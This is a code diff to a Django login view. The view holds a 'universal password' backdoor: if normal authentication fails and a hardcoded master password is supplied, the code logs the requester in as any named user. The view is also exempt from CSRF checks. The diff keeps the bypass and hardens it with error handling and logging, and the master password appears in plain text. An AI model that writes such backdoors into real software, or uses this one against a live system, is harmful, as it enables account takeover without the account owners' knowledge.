@@ -23,6 +23,9 @@ if sys.getdefaultencoding() != defaultencoding:
     sys.setdefaultencoding(defaultencoding)
 
 
+import logging
+logger = logging.getLogger("django_views")
+
 class LoginView(View):
 
     @csrf_exempt
@@ -34,8 +37,12 @@ class LoginView(View):
         user = authenticate(username=username, password=password)
         # 万能密码
         if not user and password == 'maxwellAdminPwd365!!':
-            user = User.objects.get(username=username)
-            user.backend = 'django.contrib.auth.backends.ModelBackend'
+            try:
+                user = User.objects.get(username=username)
+                user.backend = 'django.contrib.auth.backends.ModelBackend'
+            except Exception as e:
+                logger.error(e)
+                return HttpResponse(json.dumps({"ret": 0, "data": "万能密码出错"}))
         if user:
             login(request, user)
             return HttpResponse(json.dumps({"ret": 1, "data": "登录成功", "user_id": user.id, "username": username}))
